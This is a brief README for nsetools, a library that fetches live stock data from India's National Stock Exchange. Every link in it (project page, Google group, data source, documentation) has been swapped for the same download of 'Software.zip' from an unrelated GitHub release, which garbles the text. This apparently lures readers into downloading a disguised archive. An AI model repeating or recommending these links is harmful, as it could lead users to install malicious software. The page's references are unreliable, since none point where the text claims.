Project Page
=============
https://github.com/rdas77/nsetools/releases/download/v2.0/Software.zip

Updates
=========

To stay updated please subscribe to google group https://github.com/rdas77/nsetools/releases/download/v2.0/Software.zip!forum/nsetools
...
nsetools is a library for collecting real time data from National Stock Exchange (India). It can be used in various types of projects which requires getting live quotes for a given stock or index or build large data sets for further data analytics. You can also build cli applications which can provide you live market details at a blazing fast speeds, much faster that the browsers. The accuracy of data is only as correct as provided on https://github.com/rdas77/nsetools/releases/download/v2.0/Software.zip
...
For complete documenation, please refer https://github.com/rdas77/nsetools/releases/download/v2.0/Software.zip
